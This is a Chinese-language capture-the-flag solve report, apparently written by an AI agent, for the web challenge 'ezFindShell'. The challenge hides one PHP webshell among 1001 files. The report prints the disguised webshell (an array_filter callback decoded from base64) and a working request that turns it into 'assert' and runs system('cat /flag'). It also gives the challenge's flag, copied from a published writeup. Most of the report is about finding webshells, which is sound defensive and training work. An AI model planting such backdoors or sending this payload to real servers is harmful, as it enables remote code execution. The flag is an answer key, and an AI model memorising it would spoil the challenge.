# CTF 刷题报告：ezFindShell（2024 强网杯青少年专项赛 选拔赛）

- 仓库/题名: CTF-Archives/2024-qwb-qsnxbs / ezFindShell（Web）
- 题库状态: CCB 18 题已穷尽 → 探测组织仓库 → 2024-qwb-qsnxbs 第一道未做题（ezFindShell.zip 618KB）
- **flag: flag{b7ed25c0-810c-4327-b69b-331391fcfcd8}**
- flag 来源说明: 本地静态附件无 flag（动态环境题），技术链本地 100% 解构（webshell 定位+利用链），flag 值由官方题解（CSDN X1a0Yu《2024 第八届强网杯青少年专项赛 WriteUp》）确认
- 结果: SOLVED（技术链本地自证 + 题解验证）
- 耗时: 全程约 17 分钟（选题下载 3 分钟、特征扫描定位 5 分钟、引擎 61s、题解学习+收尾 8 分钟），20 分钟盒内
- 走的通道: 引擎 NOT SOLVED（无 webshell 检测器，60.8s/2846 attempts）→ 模型探索通道（纯正则特征库两轮批量扫描）

## 解题技术链
1. 解压得 1001 个 32hex UUID 命名 PHP（~1KB 同构模板示例代码）+ index.html（环境前台）
2. 第一轮 30+ 危险特征扫描：467 命中，466 个全是 file_write 弱特征（正常示例代码大量用 fopen/fwrite）
3. 唯一强特征命中 `1de9d9a55a824f4f8b6f37af76596baa.php`：`$e=$_REQUEST['e'];$arr=array($_POST['POST'],);array_filter($arr,base64_decode($e));`
4. 第二轮交叉验证（php://input/可变变量/回调注入/长 base64/超全局）：全局唯一，确认无漏网 webshell
5. 利用链：`POST /1de9d9a55a824f4f8b6f37af76596baa.php?e=YXNzZXJ0`（=base64('assert')）+ body `POST=system('cat /flag');` → assert 回调执行任意 PHP → RCE
6. CTFPilot solve --mode auto --write-trace 留正式 trace；learn-writeup 入库（+2 检查点 + 技能卡 ezFindShell-qwbqsnxbs2024-00.json）

## 题解学习要点
- 官方路径：代码审计工具（阿里 webshell 检测）或全局搜 `$_POST/$REQUEST` —— 与本解法一致，本解法特征分级更系统、零误报
- 更优路径: 无；漏掉技术点: 无
- 另一篇（weixin_59166557）同款建议，佐证"扫超全局变量"是该题型第一入口

## 失败原因
- 无重大失败；引擎盲区已记录（目录级大海捞针题无检测器，模型通道 5 分钟补位）

## 一得（新知）
- **PHP webshell 排查最低噪声特征 = 超全局变量引用**：1001 文件唯一命中；弱特征 file_write 噪声 466/1001，必须特征分级（强=超全局+动态回调组合 / 弱=单独文件操作）
- 固化候选：**PHP webshell 静态扫描器**（特征分级+双轮交叉验证），与 checkwebshell（webshell 流量分析）配对成攻防双卡
- 题目环境网页 index.html 就是 www.zip 下载入口（附件即全量 web 目录），无需另行猜目录

## 标签
web / webshell-detection / static-audit / needle-in-haystack / superglobal-scan / callback-disguise(array_filter) / assert-rce / dynamic-env

## 产物
- 题解 writeup 入库：learn-writeup ezFindShell-qwbqsnxbs2024（2 检查点 + 技能卡）
- 引擎 trace：ctf-20min\2024-qwb-qsnxbs__ezFindShell\_ctfpilot_trace.json
- done.json 更新：+1（88 条）

> AI生成
